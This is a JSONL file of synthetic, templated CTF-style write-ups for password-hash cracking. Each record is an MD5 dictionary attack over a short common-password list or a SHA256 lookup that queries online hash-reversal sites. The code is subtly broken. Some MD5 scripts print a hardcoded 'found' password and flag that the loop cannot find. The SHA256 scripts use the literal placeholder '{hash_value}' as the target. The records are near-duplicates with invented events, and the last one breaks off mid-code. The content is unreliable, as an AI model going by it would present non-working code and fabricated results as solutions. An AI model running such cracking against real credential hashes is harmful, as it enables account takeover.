{"id": "synthetic_hash_076", "team": "synthetic_team_8", "event": "CTF_2024_Event_15", "challenge_name": "MD5 Dictionary Attack #77", "challenge_description": "Crack MD5 hash using dictionary attack", "attack_type": "Hash", "tools_used": ["hashlib"], "difficulty": "easy", "writeup": "# MD5 Dictionary Attack\n\n## Challenge Description\nCrack MD5 hash using dictionary attack\n\n## Analysis\nThis challenge involves md5 dictionary attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"5ebe2294ecd0e0f08eab7690d2a6ee69\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: secret\")\n        print(f\"Flag: flag{secret}\")\n        break\n\n```\n\n## Tools Used\n- hashlib\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"5ebe2294ecd0e0f08eab7690d2a6ee69\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: secret\")\n        print(f\"Flag: flag{secret}\")\n        break\n", "url": "https://synthetic-ctf.example.com/hash/76", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.835624", "synthetic": true}
{"id": "synthetic_hash_077", "team": "synthetic_team_3", "event": "CTF_2024_Event_3", "challenge_name": "MD5 Dictionary Attack #78", "challenge_description": "Crack MD5 hash using dictionary attack", "attack_type": "Hash", "tools_used": ["hashlib"], "difficulty": "easy", "writeup": "# MD5 Dictionary Attack\n\n## Challenge Description\nCrack MD5 hash using dictionary attack\n\n## Analysis\nThis challenge involves md5 dictionary attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"5ebe2294ecd0e0f08eab7690d2a6ee69\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: secret\")\n        print(f\"Flag: flag{secret}\")\n        break\n\n```\n\n## Tools Used\n- hashlib\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"5ebe2294ecd0e0f08eab7690d2a6ee69\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: secret\")\n        print(f\"Flag: flag{secret}\")\n        break\n", "url": "https://synthetic-ctf.example.com/hash/77", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.835646", "synthetic": true}
{"id": "synthetic_hash_078", "team": "synthetic_team_6", "event": "CTF_2024_Event_5", "challenge_name": "MD5 Dictionary Attack #79", "challenge_description": "Crack MD5 hash using dictionary attack", "attack_type": "Hash", "tools_used": ["hashlib"], "difficulty": "easy", "writeup": "# MD5 Dictionary Attack\n\n## Challenge Description\nCrack MD5 hash using dictionary attack\n\n## Analysis\nThis challenge involves md5 dictionary attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"21232f297a57a5a743894a0e4a801fc3\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: admin\")\n        print(f\"Flag: flag{admin}\")\n        break\n\n```\n\n## Tools Used\n- hashlib\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"21232f297a57a5a743894a0e4a801fc3\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: admin\")\n        print(f\"Flag: flag{admin}\")\n        break\n", "url": "https://synthetic-ctf.example.com/hash/78", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.835670", "synthetic": true}
{"id": "synthetic_hash_079", "team": "synthetic_team_4", "event": "CTF_2024_Event_12", "challenge_name": "SHA256 Rainbow Table #80", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/79", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.835685", "synthetic": true}
{"id": "synthetic_hash_080", "team": "synthetic_team_4", "event": "CTF_2024_Event_9", "challenge_name": "SHA256 Rainbow Table #81", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/80", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.835698", "synthetic": true}
{"id": "synthetic_hash_081", "team": "synthetic_team_8", "event": "CTF_2024_Event_7", "challenge_name": "SHA256 Rainbow Table #82", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/81", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.835713", "synthetic": true}
{"id": "synthetic_hash_082", "team": "synthetic_team_6", "event": "CTF_2024_Event_4", "challenge_name": "SHA256 Rainbow Table #83", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/82", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.835729", "synthetic": true}
{"id": "synthetic_hash_083", "team": "synthetic_team_4", "event": "CTF_2024_Event_2", "challenge_name": "SHA256 Rainbow Table #84", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/83", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.835743", "synthetic": true}
{"id": "synthetic_hash_084", "team": "synthetic_team_9", "event": "CTF_2024_Event_7", "challenge_name": "MD5 Dictionary Attack #85", "challenge_description": "Crack MD5 hash using dictionary attack", "attack_type": "Hash", "tools_used": ["hashlib"], "difficulty": "easy", "writeup": "# MD5 Dictionary Attack\n\n## Challenge Description\nCrack MD5 hash using dictionary attack\n\n## Analysis\nThis challenge involves md5 dictionary attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"5ebe2294ecd0e0f08eab7690d2a6ee69\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: secret\")\n        print(f\"Flag: flag{secret}\")\n        break\n\n```\n\n## Tools Used\n- hashlib\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"5ebe2294ecd0e0f08eab7690d2a6ee69\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: secret\")\n        print(f\"Flag: flag{secret}\")\n        break\n", "url": "https://synthetic-ctf.example.com/hash/84", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.835769", "synthetic": true}
{"id": "synthetic_hash_085", "team": "synthetic_team_5", "event": "CTF_2024_Event_19", "challenge_name": "MD5 Dictionary Attack #86", "challenge_description": "Crack MD5 hash using dictionary attack", "attack_type": "Hash", "tools_used": ["hashlib"], "difficulty": "easy", "writeup": "# MD5 Dictionary Attack\n\n## Challenge Description\nCrack MD5 hash using dictionary attack\n\n## Analysis\nThis challenge involves md5 dictionary attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"482c811da5d5b4bc6d497ffa98491e38\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: password123\")\n        print(f\"Flag: flag{password123}\")\n        break\n\n```\n\n## Tools Used\n- hashlib\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"482c811da5d5b4bc6d497ffa98491e38\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: password123\")\n        print(f\"Flag: flag{password123}\")\n        break\n", "url": "https://synthetic-ctf.example.com/hash/85", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.835792", "synthetic": true}
{"id": "synthetic_hash_086", "team": "synthetic_team_9", "event": "CTF_2024_Event_11", "challenge_name": "SHA256 Rainbow Table #87", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/86", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.835815", "synthetic": true}
{"id": "synthetic_hash_087", "team": "synthetic_team_1", "event": "CTF_2024_Event_12", "challenge_name": "MD5 Dictionary Attack #88", "challenge_description": "Crack MD5 hash using dictionary attack", "attack_type": "Hash", "tools_used": ["hashlib"], "difficulty": "easy", "writeup": "# MD5 Dictionary Attack\n\n## Challenge Description\nCrack MD5 hash using dictionary attack\n\n## Analysis\nThis challenge involves md5 dictionary attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"482c811da5d5b4bc6d497ffa98491e38\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: password123\")\n        print(f\"Flag: flag{password123}\")\n        break\n\n```\n\n## Tools Used\n- hashlib\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"482c811da5d5b4bc6d497ffa98491e38\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: password123\")\n        print(f\"Flag: flag{password123}\")\n        break\n", "url": "https://synthetic-ctf.example.com/hash/87", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.835834", "synthetic": true}
{"id": "synthetic_hash_088", "team": "synthetic_team_2", "event": "CTF_2024_Event_9", "challenge_name": "MD5 Dictionary Attack #89", "challenge_description": "Crack MD5 hash using dictionary attack", "attack_type": "Hash", "tools_used": ["hashlib"], "difficulty": "easy", "writeup": "# MD5 Dictionary Attack\n\n## Challenge Description\nCrack MD5 hash using dictionary attack\n\n## Analysis\nThis challenge involves md5 dictionary attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"21232f297a57a5a743894a0e4a801fc3\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: admin\")\n        print(f\"Flag: flag{admin}\")\n        break\n\n```\n\n## Tools Used\n- hashlib\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"21232f297a57a5a743894a0e4a801fc3\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: admin\")\n        print(f\"Flag: flag{admin}\")\n        break\n", "url": "https://synthetic-ctf.example.com/hash/88", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.835852", "synthetic": true}
{"id": "synthetic_hash_089", "team": "synthetic_team_9", "event": "CTF_2024_Event_18", "challenge_name": "SHA256 Rainbow Table #90", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/89", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.835866", "synthetic": true}
{"id": "synthetic_hash_090", "team": "synthetic_team_4", "event": "CTF_2024_Event_10", "challenge_name": "MD5 Dictionary Attack #91", "challenge_description": "Crack MD5 hash using dictionary attack", "attack_type": "Hash", "tools_used": ["hashlib"], "difficulty": "easy", "writeup": "# MD5 Dictionary Attack\n\n## Challenge Description\nCrack MD5 hash using dictionary attack\n\n## Analysis\nThis challenge involves md5 dictionary attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"482c811da5d5b4bc6d497ffa98491e38\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: 